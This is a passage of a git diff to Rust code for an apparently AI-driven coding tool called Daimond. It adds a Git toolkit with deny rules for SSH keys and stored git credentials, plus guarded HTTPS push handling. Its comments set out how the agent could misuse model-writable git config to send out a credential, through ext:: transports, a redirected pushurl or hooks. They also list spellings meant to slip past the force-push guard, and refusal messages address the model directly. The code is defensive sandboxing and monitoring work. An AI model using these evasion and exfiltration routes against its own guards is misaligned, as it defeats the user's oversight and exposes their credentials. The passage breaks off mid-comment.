@@ -10,6 +10,7 @@
 //! helpers used by the LLM client — no `serde`.
 
 use oxedyne_fe2o3_core::prelude::*;
+use oxedyne_fe2o3_text::base64;
 use oxedyne_fe2o3_text::glob::Glob;
 use oxedyne_fe2o3_text::regex::{self, Regex};
 
@@ -111,10 +112,56 @@ fn binary_refusal(path: &str, len: usize) -> Error<ErrTag> {
 #[derive(Clone, Copy, Debug, Eq, PartialEq)]
 pub enum FileRoot {
     /// The active workspace root: the FSA real folder when one is open,
-    /// else the OPFS sandbox.
+    /// else the OPFS sandbox — except for a path naming Daimond's own store,
+    /// which always resolves to the sandbox (see [`is_store_path`]).
     Workspace,
     /// The OPFS sandbox, always — never the FSA override.
     Opfs,
+    /// The FSA real folder, always — and an error when none is open.
+    ///
+    /// The mirror of [`FileRoot::Opfs`], and it exists for the one operation that has a foot in
+    /// both: bringing home Diamond files an earlier build stranded in the user's project folder.
+    /// A copy that crosses roots says so in its types rather than depending on which path happened
+    /// to be passed, and it must never quietly fall back to the sandbox — a fallback would make
+    /// that copy read OPFS onto itself and report a migration that never happened.
+    Machine,
+}
+
+/// The directory Daimond's own state lives in, under whichever root is active.
+pub const STORE_ROOT: &str = "diamonds";
+
+/// What that directory has been called before, so a workspace that has not been opened since a
+/// rename is still recognised as the store rather than as the user's work.
+///
+/// The noun moved twice, `foci` -> `facets` -> `diamonds`, and the migration that moves the
+/// directory (`crate::wasm::diamond::migrate_root`) reads it through the sandbox — so a legacy root
+/// is store state before the migration runs as well as after, and this is what says so.
+pub const STORE_ROOTS_LEGACY: [&str; 2] = ["foci", "facets"];
+
+/// Whether a workspace-relative path names Daimond's own store rather than the user's work.
+///
+/// This is the whole seam between the two roots, and the test is on the PATH, not on the caller:
+/// `diamonds/x/crystal.md` is the store whoever asked for it, and `src/diamonds/keep.md` is the
+/// user's.  No caller has to remember which it meant, which is what makes a dispatched worker --
+/// whose allow-list legitimately spans both -- expressible at all.
+///
+/// Three properties, each of which a break would violate:
+///
+/// * [`under`], never `contains`: `diamonds-old/keep.md` and `src/diamonds/keep.md` are the
+///   user's, and only whole-segment containment says so.
+/// * The empty path is NOT the store.  It addresses the root itself, which is the WORK's root --
+///   `under(p, "")` is true of every path, so the guard is mandatory or the panel's root view
+///   would list the sandbox with a folder open.
+/// * [`normalise`] first, so `diamonds/a/../../etc/x` is measured after `..` is resolved.
+///
+/// # Arguments
+/// * `path` - A workspace-relative path, as a caller wrote it.
+pub fn is_store_path(path: &str) -> bool {
+    let p = normalise(path);
+    if !p.is_empty() && under(&p, STORE_ROOT) {
+        return true;
+    }
+    !p.is_empty() && STORE_ROOTS_LEGACY.iter().any(|r| under(&p, r))
 }
 
 /// Daimond's own directory in the workspace: the skills, the config -- the rules about what a
@@ -384,13 +431,31 @@ pub enum Toolkit {
     /// Deliberately excluded: `~/.config/go/env`.  `go env -w` writes `GOFLAGS` there, and a
     /// `-toolexec` in it runs a program of the writer's choosing on every later build.
     Go,
+    /// Git: the user's own configuration, and never a credential.
+    ///
+    /// The odd one out, and worth saying why it is here.  `git` itself needs no grant -- it lives
+    /// in `/usr/bin`, which the hand's own read-only base already covers, which is why `status`,
+    /// `diff`, `log`, `add` and `commit` all work with no toolkit at all.  What does not work is
+    /// everything the user configured GLOBALLY: their name and email, and `core.hooksPath`, which
+    /// is where a credential-scanning `pre-commit` hook usually lives.  A git that cannot read
+    /// `~/.gitconfig` runs without the user's identity and without their hooks, and it does so
+    /// SILENTLY -- an unreadable hooks directory is indistinguishable from an empty one.  Refusing
+    /// `--no-verify` while the hook cannot run at all would be a guard protecting nothing.
+    ///
+    /// Deliberately excluded: `~/.ssh`, which nothing here ever needs and which is denied outright;
+    /// `~/.git-credentials`, which `credential.helper store` writes in plain text; and
+    /// `~/.config/git/credentials`, the same file where XDG puts it.
+    ///
+    /// A hooks directory outside the granted root is still unreachable, and the hook still does not
+    /// run: the page cannot read `~/.gitconfig` and so cannot know where to look.
+    Git,
 }
 
 impl Toolkit {
 
     /// Every toolkit, in the order they are offered to the user.
-    pub fn all() -> [Self; 4] {
-        [Self::Rust, Self::Node, Self::Python, Self::Go]
+    pub fn all() -> [Self; 5] {
+        [Self::Rust, Self::Node, Self::Python, Self::Go, Self::Git]
     }
 
     /// The toolkit's name, which is what a Diamond records.
@@ -400,6 +465,7 @@ impl Toolkit {
             Self::Node   => "node",
             Self::Python => "python",
             Self::Go     => "go",
+            Self::Git    => "git",
         }
     }
 
@@ -410,6 +476,7 @@ impl Toolkit {
             Self::Node   => "Node",
             Self::Python => "Python",
             Self::Go     => "Go",
+            Self::Git    => "Git",
         }
     }
 
@@ -420,6 +487,7 @@ impl Toolkit {
             Self::Node   => "node and npm",
             Self::Python => "python, pip and what pip installed for the user",
             Self::Go     => "the go command",
+            Self::Git    => "git, with the user's own name, email and hooks",
         }
     }
 
@@ -433,7 +501,7 @@ impl Toolkit {
                 return Ok(k);
             }
         }
-        Err(err!("'{}' is not a toolkit. Known toolkits: rust, node, python, go.", name;
+        Err(err!("'{}' is not a toolkit. Known toolkits: rust, node, python, go, git.", name;
             Invalid, Input))
     }
 
@@ -500,6 +568,20 @@ impl Toolkit {
                     why: "go env -w writes GOFLAGS there, and a -toolexec in it runs on every \
                         later build" },
             ],
+            Self::Git => &[
+                Grant { tail: ".gitconfig",           level: Level::Ro,
+                    why: "the user's own git configuration: their name, their email, and the \
+                        hooks path" },
+                Grant { tail: ".config/git",          level: Level::Ro,
+                    why: "the same configuration where XDG puts it, and the global ignore file" },
+                Grant { tail: ".git-credentials",     level: Level::Deny,
+                    why: "the passwords credential.helper store writes in plain text" },
+                Grant { tail: ".config/git/credentials", level: Level::Deny,
+                    why: "the same passwords, in the XDG location" },
+                Grant { tail: ".ssh",                 level: Level::Deny,
+                    why: "the private keys, which nothing here needs and which pushing does not \
+                        use" },
+            ],
         }
     }
 
@@ -515,6 +597,8 @@ impl Toolkit {
             Self::Node   => &[],
             Self::Python => &[".local/bin", ".pyenv/shims"],
             Self::Go     => &["go/bin"],
+            // git is in `/usr/bin`, which `PATH_BASE` already carries.
+            Self::Git    => &[],
         }
     }
 
@@ -530,7 +614,30 @@ impl Toolkit {
             Self::Python => &[("PIP_CACHE_DIR", ".cache/pip")],
             Self::Go     => &[("GOPATH", "go"), ("GOMODCACHE", "go/pkg/mod"),
                                  ("GOCACHE", ".cache/go-build")],
+            // git finds its global configuration through `HOME` and nothing else; see
+            // [`Toolkit::needs_home`], which is where that exception is made and argued.
+            Self::Git    => &[],
         }
+    }
+
+    /// Whether this toolkit needs `HOME` set to the home directory itself.
+    ///
+    /// Only git does, and it is the exception the comment on [`Toolkit::vars`] warns against --
+    /// so it is worth saying why it is safe here and would not be in general.
+    ///
+    /// That comment's objection is that setting `HOME` points every tool at the whole home
+    /// directory.  It points them at it; it does not GRANT it.  The fence decides what is
+    /// reachable, and under a Git grant that is two paths and no more, so a tool that follows
+    /// `HOME` somewhere else meets a refusal rather than a file.  Cargo is the case worth
+    /// checking: with `HOME` set it looks for `~/.cargo/config.toml`, which the Rust toolkit
+    /// deliberately does not grant, and it is denied -- the same outcome as not finding it.
+    ///
+    /// `GIT_CONFIG_GLOBAL` would name the file directly and avoid `HOME` altogether, and it was
+    /// rejected: it OVERRIDES git's own search, so pointing it at `~/.gitconfig` would hide a
+    /// configuration that lives at `~/.config/git/config` instead, and the page cannot see which
+    /// of the two this user has.  Setting `HOME` lets git do its own looking.
+    pub fn needs_home(&self) -> bool {
+        matches!(self, Self::Git)
     }
 }
 
@@ -994,6 +1101,11 @@ impl Kit {
                 }
             }
         }
+        // The one variable that is not a path under a granted folder but the folder they are all
+        // under. See `Toolkit::needs_home` for why this is safe and why it is not general.
+        if kits.iter().any(|k| k.needs_home()) && !out.env.iter().any(|(n, _)| n == "HOME") {
+            out.env.push((fmt!("HOME"), home.clone()));
+        }
         if !bins.is_empty() {
             // The base is appended and not replaced: a build reaches `cc`, `ld` and `git` through
             // it, and a toolkit that took them away would break the builds it exists to enable.
@@ -1004,11 +1116,23 @@ impl Kit {
 
     /// This kit's environment as the JSON the hand reads: a list of `[name, value]` pairs.
     pub fn env_json(&self) -> String {
-        let pairs: Vec<String> = self.env.iter()
-            .map(|(k, v)| fmt!("[\"{}\",\"{}\"]", json_escape(k), json_escape(v)))
-            .collect();
-        fmt!("[{}]", pairs.join(","))
+        env_json_of(&self.env)
     }
+}
+
+/// An environment as the JSON the hand reads: a list of `[name, value]` pairs.
+///
+/// Separate from [`Kit::env_json`] because a command's environment now has two sources -- the
+/// granted toolchain and, on a push, the credential -- and one serialiser for both is what stops
+/// them being escaped by two slightly different rules.
+///
+/// # Arguments
+/// * `env` - The pairs, in the order they should reach the hand.
+fn env_json_of(env: &[(String, String)]) -> String {
+    let pairs: Vec<String> = env.iter()
+        .map(|(k, v)| fmt!("[\"{}\",\"{}\"]", json_escape(k), json_escape(v)))
+        .collect();
+    fmt!("[{}]", pairs.join(","))
 }
 
 /// The bounds a turn runs with, restated as the fence the machine hand enforces.
@@ -1239,6 +1363,74 @@ pub(crate) fn normalise(path: &str) -> String {
         }
     }
     parts.join("/")
+}
+
+/// The refusal a file tool gives for an absolute path, or `None` where the path is relative.
+///
+/// There are three path conventions here and nothing in a model's training says which is which:
+/// the file tools address the workspace, `run`'s `argv` addresses the machine, and `run`'s `cwd`
+/// addresses the workspace again.  An absolute path handed to a file tool was read as a chain of
+/// folders *inside* the workspace -- `/home/u/x` became `home/u/x` -- so the browser answered
+/// "OPFS: open dir 'home' failed", which names neither the convention nor the fix, and a turn went
+/// on it every session.  The convention is therefore said here, at the moment it is met.
+///
+/// # Arguments
+/// * `tool` - The tool asked, named so the model knows which of the three conventions it met.
+/// * `path` - The path as the model wrote it.
+fn absolute_path_refusal(tool: &Tool, path: &str) -> Option<String> {
+    if !path.starts_with('/') {
+        return None;
+    }
+    // The first segment is the recognition hook: it is the folder name the OPFS edge used to
+    // complain about, so a model that has seen that message can join the two.
+    let norm = normalise(path);
+    let head = norm.split('/').next().unwrap_or("");
+    let inside = if head.is_empty() {
+        String::new()
+    } else {
+        fmt!(" -- read as written it names a folder called '{}' inside the workspace, which is \
+            not there", head)
+    };
+    Some(fmt!(
+        "Refused: '{}' is an absolute path on the machine, and {} takes a path relative to the \
+        workspace{}. Give the path from the workspace root down, e.g. 'src/main.rs'. Absolute \
+        paths belong only in run's 'argv'; run's 'cwd' is workspace-relative, like this one.",
+        path, tool.name(), inside))
+}
+
+/// The refusal a `run` call gets for an absolute `cwd`.
+///
+/// `run` is the one tool with a different convention on each side -- `argv` is the machine's,
+/// `cwd` is the workspace's -- and an absolute `cwd` was joined onto the granted root and sent, so
+/// the hand answered about `/home/u/proj/home/u/proj/src`.  The doubling is at least visible, but
+/// the fix is not, and the fix is computable here: the granted root is known at this point, so
+/// what the model should have written is the tail of the path it already wrote.
+///
+/// # Arguments
+/// * `cwd` - The absolute directory the model asked for.
+/// * `root` - The folder the hand granted, which is the workspace root on this machine.
+#[cfg(any(target_arch = "wasm32", test))]
+fn run_cwd_refusal(cwd: &str, root: &str) -> String {
+    let root = root.trim_end_matches('/');
+    // Where it would have been looked for, spelled out, because that is the sentence the model
+    // will have seen come back from the hand.
+    let doubled = fmt!("{}/{}", root, normalise(cwd));
+    let inside = cwd.strip_prefix(root)
+        .filter(|tail| tail.is_empty() || tail.starts_with('/'))
+        .map(normalise);
+    let fix = match inside {
+        Some(rel) if rel.is_empty() =>
+            fmt!("That folder IS the workspace root, so leave 'cwd' out."),
+        Some(rel) =>
+            fmt!("Pass '{}' instead.", rel),
+        None =>
+            fmt!("The workspace is '{}', and a command runs nowhere else, so name a directory \
+                inside it.", root),
+    };
+    fmt!(
+        "Refused: 'cwd' is relative to the workspace and '{}' is absolute, so it would be looked \
+        for at '{}'. {} Only 'argv' takes the machine's own paths.",
+        cwd, doubled, fix)
 }
 
 // ── Content that did not come from the user ─────────────────────────
@@ -1789,6 +1981,678 @@ pub fn run_decision(mode: Mode, argv: &[String], answer: Option<Verdict>) -> Egr
 }
 
 
+// ── Pushing to a remote ─────────────────────────────────────────────
+//
+// `git status`, `diff`, `log`, `add` and `commit` all work inside the compartment and `git push`
+// cannot, and the reason is not a gap that could be filled by widening the fence.  Pushing over SSH
+// needs `~/.ssh`, which is outside every compartment, and `ssh-agent`, which is a named unix socket
+// -- and the hand's system-call filter refuses `socket(AF_UNIX, …)` UNCONDITIONALLY, because a
+// message to the session bus started a process the kernel fence never bound, which then read a file
+// the fence denied (`hand/REVIEW.md` §1.3).  That refusal is a closed escape and is not to be
+// loosened for a convenience.
+//
+// So Daimond pushes over HTTPS with a credential the APP holds, and the whole of the design is in
+// three sentences.
+//
+// **The token is never in `argv`.**  A URL of the form `https://oauth2:TOKEN@github.com/…` is the
+// exact shape the journal's redaction was rewritten to catch (`hand/REVIEW.md` §2.4), and putting a
+// secret somewhere and then relying on a scrubber to take it out again is the wrong order: the
+// scrubber is the last line, not the first.  `argv` is also `/proc/<pid>/cmdline`, readable by
+// every process the user runs.
+//
+// **The token is never in a file.**  A credential helper and `http.extraHeader` in `.git/config`
+// both write the secret to disc inside a workspace the model can read with `file_read` -- and
+// `.git/config` is a file the model can WRITE, so a helper configured there would be a program of
+// the model's choosing running with the credential in its environment.
+//
+// **The token goes in the environment, which is the app's and not the model's.**  This is the same
+// rule that keeps `LD_PRELOAD` out of the model's hands: `run` has no `env` argument, and the hand's
+// `screen_env` refuses one anyway.  Git reads configuration from `GIT_CONFIG_COUNT` and
+// `GIT_CONFIG_KEY_<n>` / `GIT_CONFIG_VALUE_<n>` (git 2.31 and later) exactly as it reads `-c`, so
+// every setting a push needs travels through the environment: no file is written, no argument is
+// added, and nothing survives the command.
+//
+// `GIT_ASKPASS` and a credential helper were both considered and both need a HELPER PROGRAM on
+// disc that holds or prints the secret -- a file, inside the fence, that any later command can read
+// -- so they lose on the same point the URL form loses on.  `http.extraHeader` on the command line
+// (`git -c http.extraHeader=…`) puts the secret in `argv`.  The environment is the only channel
+// that is the app's alone.
+//
+// # What the injected configuration is for, line by line
+//
+// `url.https://<host>/.insteadOf` rewrites the user's SSH remote at push time, so their
+// `git@github.com:owner/repo.git` needs no editing and nothing is written to `.git/config`.
+//
+// `http.https://<host>/.extraHeader` carries the credential, and it is SCOPED TO ONE HOST on
+// purpose.  A global `http.extraHeader` would be sent to whatever host the push reached -- and the
+// model can write `.git/config`, so it can point `remote.origin.pushurl` at a host of its own
+// choosing.  Scoped, that push simply arrives unauthenticated; unscoped, it arrives with the
+// user's token.
+//
+// `credential.helper` set EMPTY resets the helper list, so a helper configured in the repository's
+// own `.git/config` -- which the model can write -- is cleared rather than run.
+//
+// `protocol.allow=never` with `protocol.https.allow=always` closes git's `ext::` transport, which
+// runs a command named in the remote's URL.  `.git/config` being model-writable makes that a live
+// exfiltration path and not a theoretical one.
+//
+// `core.hooksPath` is pointed at a directory inside `.daimond`, which every fence denies, so a
+// push runs NO hooks.  A `pre-push` hook is a script in the repository the model can write, and it
+// would run with the credential in its environment.  The cost is that the user's own `pre-push`
+// hook does not run on a Daimond push; the credential-scanning hook they actually rely on is
+// `pre-commit`, and committing is untouched.
+//
+// # Why the guards matter more than any of that
+//
+// The danger is not the token.  It is that a push can destroy work that exists nowhere else.  A
+// push that only fast-forwards cannot: the receiving end refuses a non-fast-forward update unless
+// it is forced.  So every way of forcing one is refused, and so is every way of deleting a ref.
+//
+// The guard lives HERE, in the page, and it is the same decision as the credential: an `argv` that
+// does not pass gets no environment, and a push with no credential does not authenticate.  There
+// is no spelling that evades the guard and keeps the token.  `env git push --force`, `sh -c 'git
+// push -f'` and a shell script in the workspace all take the same road: `argv[0]` is not `git`, so
+// nothing is injected, so the push fails at the remote.  What that does NOT cover is a repository
+// that already has working credentials of its own -- an HTTPS remote with a token in `.git/config`,
+// or a `.git-credentials` inside the granted root -- and there the hand is the only place a guard
+// could bite.  `hand/src/exec.rs` should refuse the same list; see the note in this module's
+// report.
+
+/// The user name a token travels as when the app names none.
+///
+/// GitHub's own convention for a token used as an HTTP password; GitLab wants `oauth2`, which is
+/// why this is a default and not a constant the caller cannot change.
+const PUSH_USER_DEFAULT: &str = "x-access-token";
+
+/// The most characters a push credential may be.
+///
+/// Generous -- a GitHub fine-grained token is under 100 and a JWT can be several hundred -- and
+/// present only so that a pasted file cannot become an environment variable.
+const PUSH_TOKEN_MAX: usize = 512;
+
+/// A credential the app holds for pushing over HTTPS.
+///
+/// The fields are private and there is no getter for the token, so **nothing outside this module
+/// can read it**.  What leaves here is an environment for one command and a host name for the
+/// briefing.
+pub struct PushCred {
+    /// The bare host it authenticates against, lower-cased: `github.com`.
+    host:  String,
+    /// The user name the token travels as.
+    user:  String,
+    /// The secret itself.
+    token: String,
+}
+
+/// Written by hand so the token cannot reach a log through a derived `Debug`.
+///
+/// [`ToolContext`] and [`ToolRegistry`] both derive `Debug` and both get formatted in anger; a
+/// secret in a struct with a derived `Debug` is a secret with a publication schedule.
+impl std::fmt::Debug for PushCred {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "PushCred {{ host: {:?}, user: {:?}, token: <withheld> }}", self.host, self.user)
+    }
+}
+
+impl PushCred {
+
+    /// A credential, checked into a shape that can travel in an HTTP header and in a git URL.
+    ///
+    /// Every refusal names the field and never the value: an error message carrying the token
+    /// would put it in the one place this whole arrangement keeps it out of.
+    ///
+    /// # Arguments
+    /// * `host` - The bare host, as in `github.com`: no scheme, no path, no port, no user.
+    /// * `user` - The user name the token travels as, or empty for [`PUSH_USER_DEFAULT`].
+    /// * `token` - The secret.
+    pub fn new(host: &str, user: &str, token: &str) -> Outcome<Self> {
+        let h = host.trim().trim_end_matches('/').to_ascii_lowercase();
+        let shaped = !h.is_empty()
+            && h.contains('.')
+            && !h.starts_with('.')
+            && !h.ends_with('.')
+            && h.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.');
+        if !shaped {
+            return Err(err!(
+                "'{}' is not a host a push can be authenticated against. Give the bare name, as \
+                in 'github.com': no scheme, no path, no port and no user.", host; Invalid, Input));
+        }
+        let t = token.trim();
+        if t.is_empty() {
+            return Err(err!(
+                "A push credential for '{}' was set to nothing. Clear it instead of setting it \
+                empty, so that a push says there is no credential rather than failing to \
+                authenticate with one.", h; Invalid, Input, Missing));
+        }
+        if t.len() > PUSH_TOKEN_MAX {
+            return Err(err!(
+                "The push credential for '{}' is {} characters, and the most this accepts is {}. \
+                That is long enough for every token any host issues, so a value this size is \
+                almost certainly a file rather than a credential.", h, t.len(), PUSH_TOKEN_MAX;
+                Invalid, Input, Size));
+        }
+        if !printable_ascii(t) {
+            return Err(err!(
+                "The push credential for '{}' carries a character that cannot travel in an HTTP \
+                header -- a space, a line break, a tab or something outside ASCII. A token \
+                carrying a line break would end the header and begin another one, so it is \
+                refused rather than encoded.", h; Invalid, Input));
+        }
+        let u = if user.trim().is_empty() { PUSH_USER_DEFAULT } else { user.trim() };
+        if !printable_ascii(u) || u.contains(':') {
+            return Err(err!(
+                "'{}' is not a usable user name for a push credential: it must be printable \
+                ASCII and cannot contain a colon, which is what separates the user from the \
+                token.", u; Invalid, Input));
+        }
+        Ok(Self { host: h, user: u.to_string(), token: t.to_string() })
+    }
+
+    /// The host this credential authenticates against, which is the only part of it anything
+    /// outside this module may see.
+    pub fn host(&self) -> &str {
+        &self.host
+    }
+
+    /// The `Authorization` header value, as `http.<url>.extraHeader` wants it.
+    fn header(&self) -> String {
+        fmt!("Authorization: Basic {}",
+            base64::encode(fmt!("{}:{}", self.user, self.token).as_bytes()))
+    }
+
+    /// The environment one push runs with.
+    ///
+    /// Every entry is explained in this section's opening comment.  Nothing here is derived from
+    /// `argv`, and nothing here is written anywhere: the whole configuration exists for the
+    /// lifetime of one process.
+    ///
+    /// # Arguments
+    /// * `root` - The absolute folder the hand was granted, which is where the denied `.daimond`
+    ///   directory that disables hooks lives.
+    fn git_env(&self, root: &str) -> Vec<(String, String)> {
+        let base = fmt!("https://{}/", self.host);
+        let cfg: Vec<(String, String)> = vec![
+            // The user's SSH remote, rewritten at push time. Both spellings, because
+            // `git@host:owner/repo` and `ssh://git@host/owner/repo` are both in the wild.
+            (fmt!("url.{}.insteadOf", base),    fmt!("git@{}:", self.host)),
+            (fmt!("url.{}.insteadOf", base),    fmt!("ssh://git@{}/", self.host)),
+            // The credential, scoped to one host.
+            (fmt!("http.{}.extraHeader", base), self.header()),
+            // Empty resets the helper list, so a helper in the repository's own config is cleared.
+            (fmt!("credential.helper"),         String::new()),
+            // `ext::` runs a command named in the remote's URL, and the remote's URL is in a file
+            // the model can write.
+            (fmt!("protocol.allow"),            fmt!("never")),
+            (fmt!("protocol.https.allow"),      fmt!("always")),
+            // Inside the one directory every fence denies, so no hook runs with the credential.
+            (fmt!("core.hooksPath"),
+                fmt!("{}/{}no-hooks", root.trim_end_matches('/'), DAIMOND_DIR)),
+        ];
+        let mut out = vec![(fmt!("GIT_CONFIG_COUNT"), fmt!("{}", cfg.len()))];
+        for (i, (k, v)) in cfg.into_iter().enumerate() {
+            out.push((fmt!("GIT_CONFIG_KEY_{}", i), k));
+            out.push((fmt!("GIT_CONFIG_VALUE_{}", i), v));
+        }
+        // Standard input is a pipe, so a prompt would hang until the timeout rather than fail.
+        out.push((fmt!("GIT_TERMINAL_PROMPT"), fmt!("0")));
+        out
+    }
+}
+
+/// Whether every character is printable ASCII: no control character, no space, nothing above 0x7e.
+///
+/// # Arguments
+/// * `s` - The text to check.
+fn printable_ascii(s: &str) -> bool {
+    s.chars().all(|c| (c as u32) > 0x20 && (c as u32) < 0x7f)
+}
+
+// The credential this app holds, which is one value for the app and not a field of each turn --
+// exactly as the permission rung is, and for the same reason given in that section: six places
+// build an agent, and a per-turn field is a field five of them would eventually forget to set.
+// A `RefCell` rather than a lock because the browser build is single-threaded, and because a test
+// thread wants its own copy.
+thread_local! {
+    /// The push credential, absent until the user sets one.
+    static PUSH: std::cell::RefCell<Option<PushCred>> =
+        const { std::cell::RefCell::new(None) };
+}
+
+/// Hold a push credential, or clear the one held.
+///
+/// Nothing derived from anything a model said calls this: it is the user's own setting, arriving
+/// from the page exactly as the permission rung does.
+///
+/// # Arguments
+/// * `cred` - The credential to hold, or `None` to clear it.
+///
+/// # Returns
+/// Whether a credential is held afterwards.
+pub fn set_push_cred(cred: Option<PushCred>) -> bool {
+    PUSH.with(|p| {
+        let held = cred.is_some();
+        *p.borrow_mut() = cred;
+        held
+    })
+}
+
+/// The host a push would authenticate against, or `None` where no credential is held.
+///
+/// The token itself has no accessor at all -- see [`PushCred`].
+pub fn push_host() -> Option<String> {
+    PUSH.with(|p| p.borrow().as_ref().map(|c| c.host.clone()))
+}
+
+/// The environment a push runs with, or `None` where no credential is held.
+///
+/// Private, so the only thing that can ask for it is [`Tool::run`], one line before it sends it.
+///
+/// # Arguments
+/// * `root` - The absolute folder the hand was granted.
+fn push_env(root: &str) -> Option<Vec<(String, String)>> {
+    PUSH.with(|p| p.borrow().as_ref().map(|c| c.git_env(root)))
+}
+
+/// What Daimond does about a command whose program is `git`.
+#[derive(Clone, Debug, Eq, PartialEq)]
+pub enum GitCall {
+    /// Not git at all, or a git command that needs neither a credential nor a guard.
+    Other,
+    /// A push that may proceed, and that carries the app's credential.
+    Push,
+    /// Refused before it ran, carrying the sentence the model reads.
+    Refuse(String),
+}
+
+/// Git's own options, before the subcommand, that take their value as a separate argument.
+///
+/// Needed for one thing only: finding where the subcommand is.  `git -C /somewhere push` has
+/// `push` third and `git --no-pager push` has it second, and a parser that could not tell them
+/// apart would read `/somewhere` as the subcommand and stop guarding.
+const GIT_OPT_VALUE: &[&str] = &[
+    "-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env",
+    "--super-prefix", "--attr-source",
+];
+
+/// Whether one of git's own options, before the subcommand, is refused on a push.
+///
+/// `-c` and `--config-env` add configuration to the command, and the push's configuration is the
+/// app's: which host the credential goes to, which protocols are allowed, whether a hook runs.
+/// Something able to add to that could redirect the push or put the credential back into the
+/// hands of a program in the repository.  `--exec-path` chooses which `git-*` binaries run, which
+/// is arbitrary execution by another name.
+///
+/// Everything else git takes before a subcommand -- `-C`, `--git-dir`, `--work-tree`, `--no-pager`
+/// -- only ever names a repository, and a repository is bounded by the fence, by the
+/// fast-forward-only rule and by the host the credential is scoped to.
+///
+/// # Arguments
+/// * `a` - One argument, exactly as it was written.
+fn git_opt_refused(a: &str) -> Option<&'static str> {
+    // `-c k=v` and `-ck=v` are both git; `-C` is a different option and case matters.
+    if a.starts_with("-c") && !a.starts_with("--") {
+        return Some("-c");
+    }
+    match a.split('=').next().unwrap_or(a) {
+        "--config-env" => Some("--config-env"),
+        "--exec-path"  => Some("--exec-path"),
+        _              => None,
+    }
+}
+
+/// The refusal a push option that could lose work gets.
+///
+/// One shape for all of them, because they are one decision: a push that only fast-forwards
+/// cannot destroy a commit that exists nowhere else, and every legitimate push the user makes is
+/// one.  It says who decided and what to do instead, so the model reworks the request rather than
+/// the spelling.
+///
+/// # Arguments
+/// * `spelling` - The option as it was written, so the model can see which one was meant.
+/// * `does` - What that option does, in a clause.
+fn push_refusal(spelling: &str, does: &str) -> String {
+    fmt!(
+        "Refused: '{}' {}. Daimond pushes only fast-forward, because a fast-forward push cannot \
+        destroy a commit that exists nowhere else and every other kind can. This is a rule and \
+        not a fault in the command, so do not try another spelling of it -- '-f', \
+        '--force-with-lease', a '+' in front of the refspec and '--delete' are all refused \
+        together. If the history really has to be rewritten, say so and let the user push it \
+        themselves.", spelling, does)
+}
+
+/// Whether a long option to `git push` is refused, and why.
+///
+/// Matched on the name with any `=value` removed, so `--force-with-lease=main` is caught and
+/// `--no-force-with-lease` -- which turns forcing OFF -- is not.
+///
+/// # Arguments
+/// * `name` - The option's name, without its value.
+fn push_long_refused(name: &str) -> Option<String> {
+    let does = match name {
+        "--force"             => "overwrites whatever is on the remote",
+        "--force-with-lease"  => "overwrites the remote when it looks unchanged, which is still an \
+                                  overwrite",
+        "--force-if-includes" => "is part of the force-with-lease family",
+        "--delete"            => "removes a branch or tag from the remote",
+        "--mirror"            => "makes the remote match this repository exactly, deleting every \
+                                  ref that is not here",
+        "--prune"             => "deletes remote branches that are not here",
+        "--no-verify"         => "skips the hooks that run before a push",
+        "--receive-pack"      => "names the program that runs at the far end",
+        "--exec"              => "names the program that runs at the far end",
+        "--repo"              => "sends the push to a repository other than the configured one",
+        _                     => return None,
+    };
+    Some(push_refusal(name, does))
+}
+
+/// Whether the remote a push names is one Daimond will push to.
+///
+/// Only `origin`, and the reason is not that other remotes are dangerous in themselves: the
+/// credential is scoped to ONE host, so a push aimed anywhere else arrives unauthenticated
+/// anyway.  Saying so here turns a confusing authentication failure into a sentence.
+///
+/// # Arguments
+/// * `remote` - The first positional argument after `push`.
+fn push_remote_refused(remote: &str) -> Option<String> {
+    if remote == "origin" {
+        return None;
+    }
+    let is_url = remote.contains("://")
+        || remote.contains('@')
+        || remote.contains(':')
+        || remote.starts_with('/')
+        || remote.starts_with('.');
+    if is_url {
+        return Some(fmt!(
+            "Refused: '{}' names a repository directly rather than naming a remote. Daimond \
+            pushes to 'origin' and nowhere else, and the credential it holds is scoped to one \
+            host, so a push aimed at a URL would not authenticate even if it were allowed. Write \
+            'git push origin ...'; if origin is not where this should go, that is a change for \
+            the user to make.", remote));
+    }
+    Some(fmt!(
+        "Refused: this push names the remote '{}', and Daimond pushes only to 'origin' -- the \
+        remote the repository is configured with. Write 'git push origin ...', or say what you \
+        wanted to push where and let the user do it.", remote))
+}
+
+/// Whether a refspec is one that could lose work.
+///
+/// Two shapes and both are ordinary git: a leading `+` is the refspec spelling of `--force`, and
+/// an empty source side (`:main`) is the refspec spelling of `--delete`.  Neither reads as
+/// dangerous, which is exactly why they are checked.
+///
+/// # Arguments
+/// * `spec` - One refspec, as written.
+fn push_refspec_refused(spec: &str) -> Option<String> {
+    if spec.starts_with('+') {
+        return Some(push_refusal(spec,
+            "is a forced refspec -- the leading '+' means the same as --force"));
+    }
+    if spec.starts_with(':') {
+        return Some(push_refusal(spec,
+            "is a delete refspec -- an empty source side means the same as --delete"));
+    }
+    None
+}
+
+/// The refusal any `--no-verify` gets, whatever the subcommand.
+///
+/// The sentence carries its own history, because a rule with no reason attached is a rule a model
+/// argues with: this user has a global `pre-commit` hook that blocks staged credentials, and it
+/// exists because a key reached a public repository once and a stranger was using it nine days
+/// later (`~/usr/CLAUDE.md`, "Credentials").
+///
+/// # Arguments
+/// * `sub` - The git subcommand it was written on.
+/// * `spelling` - The option as written, since `-n` and `--no-verify` are the same request.
+fn no_verify_refusal(sub: &str, spelling: &str) -> String {
+    fmt!(
+        "Refused: '{}' on 'git {}' skips the hooks, and one of those hooks reads every staged \
+        line looking for a credential. It is there because a key once reached a public repository \
+        and was being used by a stranger nine days later, and removing a file does not remove it \
+        from a repository's history. If the hook is failing, read what it caught and fix that -- \
+        that is the hook working. Never go round it.", spelling, sub)
+}
+
+/// What to do with a command the model asked to run, where that command is `git`.
+///
+/// Pure, and therefore the whole of the decision: [`Tool::run`] calls this once and either sends
+/// the refusal back or attaches the credential.  There is no third path, which is what makes "a
+/// push that does not pass the guard does not get the token" true rather than intended.
+///
+/// # What a determined caller can do around it, and why each is not a way through
+///
+/// * **Spell the program differently.**  `/usr/bin/git` is caught; `env git push --force` and
+///   `sh -c 'git push -f'` are not, and they do not need to be: `argv[0]` is not `git`, so no
+///   credential is attached, so the push does not authenticate.
+/// * **Hide the option.**  Short options are read as CLUSTERS, so `-uf`, `-fq` and `-qfu` are all
+///   caught by the `f` in them; long options are matched with any `=value` removed, so
